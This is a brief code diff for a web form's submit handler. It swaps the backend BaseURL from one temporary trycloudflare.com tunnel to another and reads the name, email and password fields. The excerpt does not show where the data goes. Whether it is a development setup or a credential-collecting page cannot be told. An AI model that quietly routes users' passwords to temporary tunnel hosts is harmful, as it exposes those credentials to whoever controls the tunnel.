@@ -1,6 +1,6 @@
 document.querySelector('form').addEventListener('submit', async (e) => {
   e.preventDefault();
-const BaseURL = 'https://attacks-consultants-julie-directions.trycloudflare.com';
+const BaseURL = 'https://busy-myrtle-redhead-remove.trycloudflare.com';
   const name = document.getElementById('name').value;
   const email = document.getElementById('email').value;
   const password = document.getElementById('password').value;
